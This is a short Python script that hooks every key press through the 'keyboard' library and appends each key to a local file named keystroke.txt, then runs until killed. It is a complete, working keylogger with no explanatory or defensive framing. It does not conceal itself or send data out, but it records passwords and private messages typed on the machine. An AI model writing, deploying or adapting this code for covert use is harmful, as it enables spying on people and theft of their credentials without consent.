import keyboard

file = "keystroke.txt"

def onKeyPress(event):
    with open(file,"a") as f:
        if event.name=="enter":
            f.write("\n")
        elif event.name=="space":
            f.write(" ")
        else:
            f.write(event.name)
keyboard.on_press(onKeyPress)

keyboard.wait()
